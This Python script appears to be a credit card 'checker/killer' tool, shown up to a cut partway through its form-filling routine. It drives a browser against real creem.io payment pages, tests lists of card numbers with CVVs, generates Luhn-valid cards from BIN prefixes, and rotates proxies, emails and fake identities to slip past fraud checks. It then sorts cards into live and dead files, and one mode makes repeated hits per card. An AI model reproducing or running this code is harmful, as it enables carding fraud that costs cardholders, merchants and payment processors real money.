import os
import sys
import time
import math
import random
import itertools
import threading
import subprocess
import socket
from datetime import datetime

from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

# --- Telegram / env ---
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

TELE_BOT_TOKEN = os.environ.get("TELE_BOT_TOKEN", "").strip()
TELE_ADMIN_IDS = set()
_raw_admins = os.environ.get("TELE_ADMIN_IDS", "").strip()
if _raw_admins:
    for _p in _raw_admins.split(","):
        _p = _p.strip()
        if _p.isdigit():
            TELE_ADMIN_IDS.add(int(_p))

BOT_STATE = {
    "running": False,
    "mode": None,
    "stop_requested": False,
    "current_card": "",
    "stats": {"live": 0, "dead": 0, "error": 0, "hits": 0},
    "chat_id": None,
}


# ==============================================================================
# TERMINAL CONTROL & COLORS
# ==============================================================================
RESET = "\033[0m"
HIDE_CURSOR = "\033[?25l"
SHOW_CURSOR = "\033[?25h"
CURSOR_HOME = "\033[H"
CLEAR_SCREEN = "\033[2J"
BOLD = "\033[1m"

def rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m"

def hsv_to_rgb(h, s, v):
    i = math.floor(h * 6)
    f = h * 6 - i
    p = v * (1 - s)
    q = v * (1 - f * s)
    t = v * (1 - (1 - f) * s)
    r, g, b = [(v, t, p), (q, v, p), (p, v, t), (p, q, v), (t, p, v), (v, p, q)][int(i) % 6]
    return int(r * 255), int(g * 255), int(b * 255)

# ==============================================================================
# MASTER BANNER
# ==============================================================================
MASTER_BANNER = r"""
 /$$$$$$   /$$$$$$        /$$$$$$$$ /$$$$$$   /$$$$$$  /$$       /$$   /$$ /$$$$$$ /$$$$$$$$
 /$$__  $$ /$$__  $$      |__  $$__//$$__  $$ /$$__  $$| $$      | $$  /$$/|_  $$_/|__  $$__/
| $$  \__/| $$  \__/         | $$  | $$  \ $$| $$  \ $$| $$      | $$ /$$/   | $$     | $$   
| $$      | $$               | $$  | $$  | $$| $$  | $$| $$      | $$$$$/    | $$     | $$   
| $$      | $$               | $$  | $$  | $$| $$  | $$| $$      | $$  $$    | $$     | $$   
| $$    $$| $$    $$         | $$  | $$  | $$| $$  | $$| $$      | $$\  $$   | $$     | $$   
|  $$$$$$/|  $$$$$$/         | $$  |  $$$$$$/|  $$$$$$/| $$$$$$$$| $$ \  $$ /$$$$$$   | $$   
 \______/  \______/          |__/   \______/  \______/ |________/|__/  \__/|______/   |__/   
"""


def play_intro_banner():
    """Simple reliable intro animation for the master banner."""
    try:
        sys.stdout.write(HIDE_CURSOR)
        sys.stdout.write(CLEAR_SCREEN)
        lines = MASTER_BANNER.strip(chr(10)).split(chr(10))
        symbols = "01#@$%&*+/"
        frames = 24
        for frame in range(frames + 1):
            progress = frame / frames
            sys.stdout.write(CURSOR_HOME)
            out = []
            for line in lines:
                row = []
                for ch in line:
                    if ch == " ":
                        row.append(" ")
                    elif random.random() < progress:
                        row.append(f"{rgb(0,255,170)}{ch}{RESET}")
                    else:
                        row.append(f"{rgb(0,80,40)}{random.choice(symbols)}{RESET}")
                out.append("".join(row))
            sys.stdout.write(chr(10).join(out) + chr(10))
            sys.stdout.flush()
            time.sleep(0.04)
        for t in range(20):
            sys.stdout.write(CURSOR_HOME)
            hue_base = t * 0.05
            out = []
            for y, line in enumerate(lines):
                row = []
                for x, ch in enumerate(line):
                    if ch == " ":
                        row.append(" ")
                    else:
                        h = (hue_base + x * 0.01 + y * 0.02) % 1.0
                        r, g, b = hsv_to_rgb(h, 1.0, 1.0)
                        row.append(f"{rgb(r,g,b)}{ch}{RESET}")
                out.append("".join(row))
            sys.stdout.write(chr(10).join(out) + chr(10))
            sys.stdout.flush()
            time.sleep(0.05)
    except KeyboardInterrupt:
        pass
    finally:
        sys.stdout.write(SHOW_CURSOR)
        print()

def print_master_banner(mode_name=""):
    print(f"{rgb(0, 255, 170)}{MASTER_BANNER}{RESET}")
    title = f"  CC TOOL  |  MODE: {mode_name.upper()}" if mode_name else "  CC TOOL  |  CHECKER  |  KILLER  |  MASTER"
    print(f"{BOLD}{rgb(0, 200, 255)}{title}{RESET}")
    print("=" * 90)

# ==============================================================================
# RESULT ANIMATIONS
# ==============================================================================
def animate_success(message):
    frames = [
        f"{rgb(0, 255, 100)}  ✓  SUCCESS  {RESET}",
        f"{rgb(0, 255, 130)}  ✓✓ SUCCESS ✓✓  {RESET}",
        f"{rgb(0, 255, 160)}  ★ SUCCESS ★  {RESET}",
        f"{rgb(50, 255, 180)}  ★★ LIVE HIT ★★  {RESET}",
        f"{rgb(0, 255, 200)}  ★★★ APPROVED ★★★  {RESET}",
    ]
    for frame in frames:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(f"  {frame}{message}")
        sys.stdout.flush()
        time.sleep(0.1)
    print()

def animate_decline(message):
    frames = [
        f"{rgb(255, 60, 60)}  ✗  DECLINED  {RESET}",
        f"{rgb(255, 40, 40)}  ✗✗ DECLINED ✗✗  {RESET}",
        f"{rgb(220, 20, 20)}  ✗✗✗ DEAD ✗✗✗  {RESET}",
        f"{rgb(180, 0, 0)}  ✗ DEAD CARD ✗  {RESET}",
    ]
    for frame in frames:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(f"  {frame}{message}")
        sys.stdout.flush()
        time.sleep(0.08)
    print()

def animate_error(message):
    frames = [
        f"{rgb(255, 200, 0)}  !  ERROR  {RESET}",
        f"{rgb(255, 180, 0)}  !! ERROR !!  {RESET}",
        f"{rgb(255, 150, 0)}  !!! FAIL !!!  {RESET}",
    ]
    for frame in frames:
        sys.stdout.write("\r" + " " * 80 + "\r")
        sys.stdout.write(f"  {frame}{message}")
        sys.stdout.flush()
        time.sleep(0.08)
    print()

# ==============================================================================
# LIVE PROCESS ANIMATOR
# ==============================================================================
class ProcessAnimator:
    def __init__(self):
        self.running = False
        self.thread = None
        self.message = "PROCESSING"
        self.lock = threading.Lock()

    def start(self, message="PROCESSING"):
        with self.lock:
            self.message = message
            if not self.running:
                self.running = True
                self.thread = threading.Thread(target=self._loop, daemon=True)
                self.thread.start()

    def update_message(self, message):
        with self.lock:
            self.message = message

    def stop(self):
        with self.lock:
            self.running = False
        if self.thread:
            self.thread.join(timeout=1.0)
        sys.stdout.write("\r" + " " * 120 + "\r")
        sys.stdout.flush()

    def _loop(self):
        frames = [
            "▰▱▱▱▱▱▱▱", "▰▰▱▱▱▱▱▱", "▰▰▰▱▱▱▱▱", "▰▰▰▰▱▱▱▱",
            "▰▰▰▰▰▱▱▱", "▰▰▰▰▰▰▱▱", "▰▰▰▰▰▰▰▱", "▰▰▰▰▰▰▰▰",
            "▱▰▰▰▰▰▰▰", "▱▱▰▰▰▰▰▰", "▱▱▱▰▰▰▰▰", "▱▱▱▱▰▰▰▰",
            "▱▱▱▱▱▰▰▰", "▱▱▱▱▱▱▰▰", "▱▱▱▱▱▱▱▰", "▱▱▱▱▱▱▱▱",
        ]
        pulse_colors = [
            (0, 255, 170), (0, 220, 255), (80, 120, 255),
            (180, 60, 255), (255, 40, 180), (255, 100, 50), (0, 255, 170),
        ]
        idx = 0
        color_idx = 0
        while True:
            with self.lock:
                if not self.running:
                    break
                msg = self.message
            bar = frames[idx % len(frames)]
            r, g, b = pulse_colors[color_idx % len(pulse_colors)]
            color = rgb(r, g, b)
            left = "⣾⣽⣻⢿⡿⣟⣯⣷"[idx % 8]
            right = "⣷⣯⣟⡿⢿⣻⣽⣾"[idx % 8]
            line = f"  {color}{left} {bar} {right}{RESET}  {BOLD}{color}{msg}{RESET}"
            sys.stdout.write("\r" + line + " " * 10)
            sys.stdout.flush()
            idx += 1
            if idx % 4 == 0:
                color_idx += 1
            time.sleep(0.07)

animator = ProcessAnimator()

# ==============================================================================
# WORKFLOW LOGGER
# ==============================================================================
def log_event(level: str, stage: str, message: str, extra: str = ""):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] [{level}] [{stage}] {message}"
    if extra:
        line += f" | {extra}"
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(line + "\n")
            f.flush()
    except Exception:
        pass
    return line

def print_workflow_header(mode, card_idx, total, raw_line, hit, total_hits, proxy, email, name):
    print(f"\n{BOLD}{rgb(0,200,255)}┌── {mode.upper()}  Card {card_idx}/{total}  Hit {hit}/{total_hits}{RESET}")
    print(f"{rgb(0,200,255)}│{RESET} CARD   : {raw_line}")
    print(f"{rgb(0,200,255)}│{RESET} PROXY  : {str(proxy)[:60]}")
    print(f"{rgb(0,200,255)}│{RESET} EMAIL  : {email}")
    print(f"{rgb(0,200,255)}│{RESET} NAME   : {name}")
    print(f"{rgb(0,200,255)}└{'─'*70}{RESET}")

def print_stage(stage: str, status: str, detail: str = ""):
    colors = {
        "OK": rgb(0, 255, 120),
        "FAIL": rgb(255, 80, 80),
        "WAIT": rgb(255, 200, 0),
        "INFO": rgb(0, 200, 255),
        "SKIP": rgb(150, 150, 150),
    }
    c = colors.get(status, RESET)
    icon = {"OK": "✓", "FAIL": "✗", "WAIT": "…", "INFO": "i", "SKIP": "-"}.get(status, "?")
    print(f"  {c}[{icon}] {stage:<22}{RESET} {detail}")
    log_event(status, stage, detail)

# ==============================================================================
# CONFIGURATION
# ==============================================================================
CONFIG = {
    # Mode: checker | killer | master
    "mode": "checker",

    # Target
    "base_url": "https://www.creem.io/payment/prod_5AAi7K8Ms7Viyf9dUtZAIX",
    "killer_url": "https://www.creem.io/payment/prod_58Iw5m0MkwZdkdeq90iZ3L",

    # Files
    "data_file": "data.txt",
    "proxy_file": "proxy.txt",
    "email_file": "email.txt",
    "bins_file": "bins.txt",

    # Identity defaults
    "default_email": "adf@example.com",
    "default_name": "asdf User",
    "default_country": "Bangladesh",
    "default_username": "asdf",

    # Timing / browser
    "timeout_ms": 45000,
    "headless": False,
    "slow_mo_ms": 0,
    "typing_delay_ms": 15,
    "hits_per_card": 1,
    "killer_hits_per_card": 25,
    "retry_on_error": 2,
    "delay_between_hits": 0.5,
    "local_proxy_port": 18081,

    # Features
    "proxy_rotation": True,
    "email_rotation": True,
    "random_identity": True,
    "random_country": False,
    "stop_on_live": False,
    "max_consecutive_timeouts": 3,
    "proxy_max_fails": 2,           # skip proxy after N fails
    "cards_per_bin": 200,           # master: cards generated per BIN batch
    "bins_per_batch": 3,            # master: how many BINs per generation batch
    "just_need_live": True,         # master: stop when min live reached
    "min_live_cards": 100,          # master: target live count before stop
    "delete_dead_files": True,      # master: wipe dead/error/unknown after each batch
    "clean_generated": True,        # master: remove generated_cards.txt after batch
}

SELECTORS = {
    "payment_form": "#payment-form",
    "email_input": "#email",
    "name_input": "#name",
    "country_combobox": 'button[role="combobox"]',
    "initial_submit_button": '#payment-form button[type="submit"]',
    "radio_wrapper": "div.yuno-payment-list__payment-method",
    "radio_hidden_input": 'input[data-testid="Yuno-radio"]',
    "payment_number_input": 'input.Yuno-input__base[aria-label="Card number"], input[name="pan"], input[aria-label*="Card number" i], input[placeholder*="0000"]',
    "expiration_date_input": 'input.Yuno-input__base[name="expirationDate"], input.Yuno-input__base[aria-label="MM/YY"], input[name="expiration"], input[aria-label*="MM" i], input[placeholder*="MM"]',
    "serial_number_input": 'input.Yuno-input__base[name="cvv"], input[name="cvv"], input[aria-label*="CVV" i], input[aria-label*="CVC" i], input[placeholder*="CVV"]',
    "user_name_input": 'input.Yuno-input__base[name="cardHolderName"], input[name="cardHolderName"], input[aria-label*="Cardholder" i], input[aria-label*="Name on card" i], input[placeholder*="Name"], input[name="holderName"]',
    "final_submit_button": '#payment-form button[type="submit"]',
    "alert_box": 'div[role="alert"], .alert, .error-message, [class*="error"], [class*="alert"]',
    "optional_loader": '.loader, [role="progressbar"], [aria-busy="true"]',
    "success_indicators": '[class*="success"], [class*="approved"], [data-status="success"]',
}

SUCCESS_KEYWORDS = [
    "success", "approved", "authorized", "paid", "completed", "thank you",
    "payment successful", "transaction successful", "order confirmed",
    "payment accepted", "successfully processed"
]

DECLINE_KEYWORDS = [
    "declined", "denied", "failed", "invalid", "incorrect", "expired",
    "insufficient", "do not honor", "pick up", "lost", "stolen",
    "restricted", "not allowed", "fraud", "security", "cvv", "cvc",
    "card number", "expiration", "timeout", "error", "unable", "rejected"
]

# ==============================================================================
# RANDOM IDENTITY
# ==============================================================================
FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph",
    "Thomas", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Steven", "Paul",
    "Andrew", "Joshua", "Kenneth", "Kevin", "Brian", "George", "Timothy", "Ronald",
    "Emma", "Olivia", "Ava", "Isabella", "Sophia", "Mia", "Charlotte", "Amelia",
    "Harper", "Evelyn", "Abigail", "Emily", "Elizabeth", "Sofia", "Madison", "Avery",
    "Ella", "Scarlett", "Grace", "Chloe", "Victoria", "Riley", "Aria", "Lily",
]
LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson",
    "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker",
]
COUNTRIES = [
    "United States", "United Kingdom", "Canada", "Australia", "Germany",
    "France", "Netherlands", "Sweden", "Norway", "Denmark", "Bangladesh",
    "India", "Singapore", "Japan", "South Korea", "Brazil", "Mexico",
]

def random_name():
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def random_username(base_name=None):
    if base_name is None:
        base_name = random.choice(FIRST_NAMES).lower()
    else:
        base_name = base_name.split()[0].lower()
    return f"{base_name}{random.randint(10, 9999)}"

def random_country():
    return random.choice(COUNTRIES)

# ==============================================================================
# LUHN CARD GENERATOR (MASTER MODE)
# ==============================================================================
def luhn_checksum(card_number: str) -> int:
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd = digits[-1::-2]
    even = digits[-2::-2]
    total = sum(odd)
    for d in even:
        total += sum(digits_of(d * 2))
    return total % 10

def is_luhn_valid(card_number: str) -> bool:
    return luhn_checksum(card_number) == 0

def generate_luhn_card(bin_prefix: str, length: int = 16) -> str:
    """Generate one Luhn-valid card number from a BIN prefix."""
    bin_prefix = "".join(c for c in bin_prefix if c.isdigit())
    if len(bin_prefix) >= length:
        bin_prefix = bin_prefix[:length - 1]
    remaining = length - len(bin_prefix) - 1
    body = bin_prefix + "".join(str(random.randint(0, 9)) for _ in range(remaining))
    # compute check digit
    for check in range(10):
        candidate = body + str(check)
        if is_luhn_valid(candidate):
            return candidate
    return body + "0"

def load_bin_lines(bins_file: str):
    """Return list of raw bin lines (non-empty, non-comment)."""
    if not os.path.exists(bins_file):
        return []
    lines = []
    with open(bins_file, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                lines.append(line)
    return lines

def generate_cards_from_bin_lines(bin_lines: list, cards_per_bin: int = 10):
    """
    Generate Luhn cards from a list of bin definition lines.
    formats: 539689 | 539689|10|2030 | 539689|10|2030|123
    Returns list of (number, exp, cvv, raw_line)
    """
    records = []
    for line in bin_lines:
        parts = [p.strip() for p in line.replace(",", "|").split("|")]
        bin_prefix = parts[0]
        mm = parts[1].zfill(2) if len(parts) > 1 else f"{random.randint(1,12):02d}"
        yy = parts[2] if len(parts) > 2 else str(random.randint(2027, 2032))
        yy_short = yy[-2:] if len(yy) >= 2 else yy
        exp = f"{mm}/{yy_short}"
        for _ in range(cards_per_bin):
            num = generate_luhn_card(bin_prefix, 16)
            cvv = parts[3] if len(parts) > 3 else f"{random.randint(100, 999)}"
            raw = f"{num}|{mm}|{yy}|{cvv}"
            records.append((num, exp, cvv, raw))
    return records

def generate_cards_from_bins(bins_file: str, cards_per_bin: int = 10):
    """Legacy full-file generator (used if batching disabled)."""
    lines = load_bin_lines(bins_file)
    if not lines:
        print(f"[Error] bins file '{bins_file}' not found or empty.")
        return []
    return generate_cards_from_bin_lines(lines, cards_per_bin)

def cleanup_batch_files():
    """Remove dead/error/unknown/generated after a master batch if configured."""
    if CONFIG.get("delete_dead_files", True):
        for fname in ("dead.txt", "error.txt", "unknown.txt"):
            try:
                if os.path.exists(fname):
                    os.remove(fname)
                    # recreate empty so appends still work
                    open(fname, "a", encoding="utf-8").close()
            except Exception:
                pass
    if CONFIG.get("clean_generated", True):
        try:
            if os.path.exists("generated_cards.txt"):
                os.remove("generated_cards.txt")
        except Exception:
            pass

def count_live_cards() -> int:
    """Count lines currently in live.txt."""
    if not os.path.exists("live.txt"):
        return 0
    try:
        with open("live.txt", "r", encoding="utf-8") as f:
            return sum(1 for line in f if line.strip())
    except Exception:
        return 0


# ==============================================================================
# PROXY MANAGER (pproxy)
# ==============================================================================
class ProxyBrowserManager:
    def __init__(self, local_port: int = 18081):
        self.local_port = local_port
        self.local_proxy_url = f"http://127.0.0.1:{local_port}"
        self.proxy_process = None
        self.current_upstream = None
        self.fail_counts = {}   # proxy_str -> fail count

    def _parse(self, proxy_str: str):
        """
        Accept ALL common formats and normalize to (scheme, host, port, user, pass):
          host:port:user:pass
          user:pass@host:port
          socks5://user:pass@host:port
          socks5://host:port:user:pass
          http://user:pass@host:port
          host:port
        Default scheme = socks5 (tool bridge expects SOCKS5).
        """
        raw = proxy_str.strip()
        if not raw:
            return None

        scheme = "socks5"
        rest = raw
        if "://" in raw:
            scheme_part, rest = raw.split("://", 1)
            scheme = scheme_part.lower()
            if scheme in ("socks", "socks4", "socks5h"):
                scheme = "socks5"
            elif scheme not in ("socks5", "http", "https"):
                scheme = "socks5"

        user = pass_ = None
        host = None
        port = None

        # Format A: user:pass@host:port
        if "@" in rest:
            auth, hostport = rest.rsplit("@", 1)
            if ":" in auth:
                user, pass_ = auth.split(":", 1)
            else:
                user = auth
            if ":" in hostport:
                host, port_s = hostport.rsplit(":", 1)
                try:
                    port = int(port_s)
                except ValueError:
                    return None
            else:
                return None
        else:
            # No @ — could be host:port:user:pass  OR  host:port
            parts = rest.split(":")
            if len(parts) == 4:
                # host:port:user:pass
                host, port_s, user, pass_ = parts
                try:
                    port = int(port_s)
                except ValueError:
                    return None
            elif len(parts) == 2:
                # host:port
                host, port_s = parts
                try:
                    port = int(port_s)
                except ValueError:
                    return None
            elif len(parts) == 3:
                # ambiguous: host:port:user  (rare) — treat as host:port:user, no pass
                host, port_s, user = parts
                try:
                    port = int(port_s)
                except ValueError:
                    return None
            else:
                return None

        if not host or port is None:
            return None
        return scheme, host, port, user, pass_

    def normalize_line(self, proxy_str: str) -> str:
        """Return a clean socks5://user:pass@host:port (or http://...) string."""
        parsed = self._parse(proxy_str)
        if not parsed:
            return proxy_str.strip()
        scheme, host, port, user, pass_ = parsed
        if user and pass_:
            return f"{scheme}://{user}:{pass_}@{host}:{port}"
        return f"{scheme}://{host}:{port}"

    def start(self, proxy_str: str, force_restart: bool = False) -> bool:
        parsed = self._parse(proxy_str)
        if not parsed:
            return False
        scheme, host, port, user, pass_ = parsed
        if scheme != "socks5":
            return False
        if (not force_restart and self.proxy_process and self.proxy_process.poll() is None
                and self.current_upstream == proxy_str):
            return True
        self.stop()
        if user and pass_:
            remote_uri = f"socks5://{host}:{port}#{user}:{pass_}"
        else:
            remote_uri = f"socks5://{host}:{port}"
        try:
            self.proxy_process = subprocess.Popen(
                [sys.executable, "-m", "pproxy",
                 "-l", f"http://127.0.0.1:{self.local_port}",
                 "-r", remote_uri],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.PIPE,
            )
            time.sleep(1.8)
            if self.proxy_process.poll() is not None:
                _, stderr = self.proxy_process.communicate()
                err = (stderr or b"").decode(errors="ignore")[:180]
                print(f"  {rgb(255,80,80)}[!] pproxy failed: {err}{RESET}")
                self.proxy_process = None
                return False
            self.current_upstream = proxy_str
            return True
        except FileNotFoundError:
            print(f"  {rgb(255,80,80)}[!] pproxy not installed → pip install pproxy{RESET}")
            return False
        except Exception as e:
            print(f"  {rgb(255,80,80)}[!] pproxy start error: {e}{RESET}")
            return False

    def force_restart(self, proxy_str: str) -> bool:
        print(f"  {rgb(255,200,0)}[!] Restarting pproxy bridge...{RESET}")
        return self.start(proxy_str, force_restart=True)

    def stop(self):
        if self.proxy_process:
            try:
                self.proxy_process.terminate()
                self.proxy_process.wait(timeout=3)
            except Exception:
                try:
                    self.proxy_process.kill()
                except Exception:
                    pass
            self.proxy_process = None
            self.current_upstream = None

    def mark_fail(self, proxy_str: str):
        self.fail_counts[proxy_str] = self.fail_counts.get(proxy_str, 0) + 1

    def mark_ok(self, proxy_str: str):
        self.fail_counts[proxy_str] = 0

    def is_dead(self, proxy_str: str) -> bool:
        return self.fail_counts.get(proxy_str, 0) >= CONFIG.get("proxy_max_fails", 2)

proxy_mgr = ProxyBrowserManager(local_port=CONFIG["local_proxy_port"])

def proxy_health_check(local_url: str, timeout: float = 10.0) -> bool:
    try:
        import urllib.request
        proxy_handler = urllib.request.ProxyHandler({"http": local_url, "https": local_url})
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [("User-Agent", "Mozilla/5.0")]
        with opener.open("https://api.ipify.org", timeout=timeout) as resp:
            ip = resp.read().decode().strip()
            return bool(ip) and len(ip) > 4
    except Exception as e:
        log_event("FAIL", "PROXY_HEALTH", str(e)[:120])
        return False

# ==============================================================================
# FILE LOADERS
# ==============================================================================
def load_records_from_file(file_path: str):
    if not os.path.exists(file_path):
        print(f"[Error] CC file '{file_path}' not found.")
        return []
    records = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line_num, line in enumerate(f, 1):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = [p.strip() for p in line.replace(",", "|").split("|")]
            try:
                if len(parts) >= 4:
                    payment_num = parts[0].replace(" ", "").replace("-", "")
                    mm = parts[1].zfill(2)
                    yy = parts[2]
                    serial_num = parts[3]
                    yy_short = yy[-2:] if len(yy) >= 2 else yy
                    exp_date = f"{mm}/{yy_short}"
                    records.append((payment_num, exp_date, serial_num, line))
                elif len(parts) == 3:
                    payment_num = parts[0].replace(" ", "").replace("-", "")
                    exp_raw = parts[1]
                    serial_num = parts[2]
                    if "/" in exp_raw:
                        exp_date = exp_raw
                    else:
                        exp_date = f"{exp_raw[:2]}/{exp_raw[2:]}" if len(exp_raw) >= 4 else exp_raw
                    records.append((payment_num, exp_date, serial_num, line))
            except Exception as e:
                print(f"[Warn] Skipping line {line_num}: {line[:50]}... ({e})")
    return records

def load_proxies(file_path: str):
    if not file_path or not os.path.exists(file_path):
        return []
    proxies = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            # Auto-normalize every format to socks5://user:pass@host:port
            normalized = proxy_mgr.normalize_line(line)
            proxies.append(normalized)
    return proxies

def load_emails(file_path: str):
    if not file_path or not os.path.exists(file_path):
        return []
    emails = []
    with open(file_path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "@" not in line:
                continue
            emails.append(line)
    return emails

# ==============================================================================
# PAGE HELPERS
# ==============================================================================
def select_country(page, country_name: str, timeout_ms: int = 10000):
    try:
        combobox = page.locator(SELECTORS["country_combobox"]).first
        combobox.wait_for(state="visible", timeout=timeout_ms)
        combobox.click()
        page.wait_for_timeout(200)
        page.keyboard.type(country_name, delay=CONFIG["typing_delay_ms"])
        page.wait_for_timeout(150)
        page.keyboard.press("Enter")
        page.wait_for_timeout(100)
        page.keyboard.press("Escape")
    except Exception:
        try:
            page.keyboard.type(country_name, delay=CONFIG["typing_delay_ms"])
            page.keyboard.press("Enter")
        except Exception:
            pass

def click_radio_option_dynamic(page, timeout_ms: int = 15000):
    start_time = time.time()
    max_duration = timeout_ms / 1000.0
    while (time.time() - start_time) < max_duration:
        wrapper = page.locator(SELECTORS["radio_wrapper"]).first
        if wrapper.count() > 0 and wrapper.is_visible():
            wrapper.scroll_into_view_if_needed()
            wrapper.click(force=True)
            return True
        hidden_input = page.locator(SELECTORS["radio_hidden_input"]).first
        if hidden_input.count() > 0:
            try:
                hidden_input.evaluate("el => el.click()")
                return True
            except Exception:
                pass
        for frame in page.frames:
            try:
                wrapper = frame.locator(SELECTORS["radio_wrapper"]).first
                if wrapper.count() > 0 and wrapper.is_visible():
                    wrapper.scroll_into_view_if_needed()
                    wrapper.click(force=True)
                    return True
                hidden_input = frame.locator(SELECTORS["radio_hidden_input"]).first
                if hidden_input.count() > 0:
                    hidden_input.evaluate("el => el.click()")
                    return True
            except Exception:
                continue
        page.wait_for_timeout(120)
    raise RuntimeError(f"Radio button not found within {timeout_ms}ms")

def fill_input_safely(page, selector: str, value: str, timeout_ms: int = 15000, field_name: str = "input"):
    start_time = time.time()
    max_duration = timeout_ms / 1000.0
    last_error = None
    while (time.time() - start_time) < max_duration:
        try:
            elem = page.locator(selector).first
            if elem.count() > 0 and elem.is_visible():
                elem.scroll_into_view_if_needed()
                elem.click(force=True)
                page.wait_for_timeout(80)
                elem.press("Control+a")
                elem.press("Backspace")
                page.wait_for_timeout(50)
                elem.press_sequentially(value, delay=CONFIG["typing_delay_ms"])
                page.wait_for_timeout(100)
                return True
        except Exception as e:
            last_error = e
        for frame in page.frames:
            try:
                elem = frame.locator(selector).first
                if elem.count() > 0 and elem.is_visible():
                    elem.scroll_into_view_if_needed()
                    elem.click(force=True)
                    page.wait_for_timeout(80)
                    elem.press("Control+a")
                    elem.press("Backspace")
                    page.wait_for_timeout(50)
                    elem.press_sequentially(value, delay=CONFIG["typing_delay_ms"])
                    page.wait_for_timeout(100)
                    return True
            except Exception as e:
                last_error = e
                continue
        try:
            js_code = f"""
            (function() {{
                const selectors = `{selector}`.split(',').map(s => s.trim());
                for (const sel of selectors) {{
                    const el = document.querySelector(sel);
                    if (el) {{
                        el.focus();
                        el.value = '';
                        el.value = '{value}';
                        el.dispatchEvent(new Event('input', {{ bubbles: true }}));
                        el.dispatchEvent(new Event('change', {{ bubbles: true }}));
                        el.dispatchEvent(new Event('blur', {{ bubbles: true }}));
                        return true;
                    }}
                }}
                return false;
            }})();
            """
            result = page.evaluate(js_code)
            if result:
                return True
        except Exception as e:
            last_error = e
        page.wait_for_timeout(150)
    raise RuntimeError(f"Could not locate/fill {field_name}: {selector} | last error: {last_error}")

def smart_wait(page, selector: str, timeout_ms: int = 30000, state: str = "visible"):
    try:
        page.locator(selector).first.wait_for(state=state, timeout=timeout_ms)
        return True
    except Exception:
        return False

def smart_wait_any(page, selectors: list, timeout_ms: int = 30000):
    start = time.time()
    while (time.time() - start) * 1000 < timeout_ms:
        for sel in selectors:
            try:
                loc = page.locator(sel).first
                if loc.count() > 0 and loc.is_visible():
                    return True
            except Exception:
                pass
            for frame in page.frames:
                try:
                    loc = frame.locator(sel).first
                    if loc.count() > 0 and loc.is_visible():
                        return True
                except Exception:
                    continue
        page.wait_for_timeout(150)
    return False

def wait_for_result(page, timeout_ms: int = 45000):
    start_time = time.time()
    max_duration = timeout_ms / 1000.0
    while (time.time() - start_time) < max_duration:
        try:
            loaders = page.locator(SELECTORS["optional_loader"]).all()
            if any(l.is_visible() for l in loaders):
                page.wait_for_timeout(200)
                continue
        except Exception:
            pass
        try:
            alerts = page.locator(SELECTORS["alert_box"]).all()
            for alert in alerts:
                if alert.is_visible():
                    msg = alert.inner_text().strip()
                    if msg and len(msg) > 2:
                        return msg
        except Exception:
            pass
        for frame in page.frames:
            try:
                alerts = frame.locator(SELECTORS["alert_box"]).all()
                for alert in alerts:
                    if alert.is_visible():
                        msg = alert.inner_text().strip()
                        if msg and len(msg) > 2:
                            return msg
            except Exception:
                continue
        try:
            current_url = page.url.lower()
            if any(x in current_url for x in ["success", "thank", "complete", "confirmed", "receipt"]):
                return "SUCCESS - Redirected to confirmation page"
        except Exception:
            pass
        try:
            success_el = page.locator(SELECTORS["success_indicators"]).first
            if success_el.count() > 0 and success_el.is_visible():
                return "SUCCESS - Success indicator detected"
        except Exception:
            pass
        page.wait_for_timeout(150)
    return "[Warning] No alert/result message appeared within timeout."

def classify_result(message: str) -> str:
    msg = message.lower()
    for kw in SUCCESS_KEYWORDS:
        if kw in msg:
            return "live"
    for kw in DECLINE_KEYWORDS:
        if kw in msg:
            return "dead"
    if "warning" in msg or "timeout" in msg or "error" in msg or "could not" in msg:
        return "error"
    return "error"

# ==============================================================================
# SINGLE HIT (STAGED)
# ==============================================================================
def process_single_entry(page, payment_number, expiration_date, serial_number,
                         email, name=None, username=None, country=None):
    name = name or CONFIG["default_name"]
    username = username or CONFIG["default_username"]
    country = country or CONFIG["default_country"]

    print_stage("NAVIGATE", "WAIT", CONFIG["base_url"][:55])
    try:
        page.goto(CONFIG["base_url"], wait_until="domcontentloaded", timeout=CONFIG["timeout_ms"])
        print_stage("NAVIGATE", "OK", f"url={page.url[:55]}")
    except Exception as e:
        print_stage("NAVIGATE", "FAIL", str(e)[:80])
        log_event("FAIL", "NAVIGATE", str(e))
        raise

    print_stage("PAYMENT_FORM", "WAIT", "waiting for form")
    if not smart_wait(page, SELECTORS["payment_form"], timeout_ms=CONFIG["timeout_ms"]):
        print_stage("PAYMENT_FORM", "FAIL", "not found")
        raise RuntimeError("Payment form not found")
    print_stage("PAYMENT_FORM", "OK", "visible")

    print_stage("EMAIL", "WAIT", email)
    smart_wait(page, SELECTORS["email_input"], timeout_ms=CONFIG["timeout_ms"])
    email_elem = page.locator(SELECTORS["email_input"]).first
    email_elem.click()
    email_elem.fill("")
    email_elem.press_sequentially(email, delay=CONFIG["typing_delay_ms"])
    print_stage("EMAIL", "OK", email)

    print_stage("NAME", "WAIT", name)
    smart_wait(page, SELECTORS["name_input"], timeout_ms=8000)
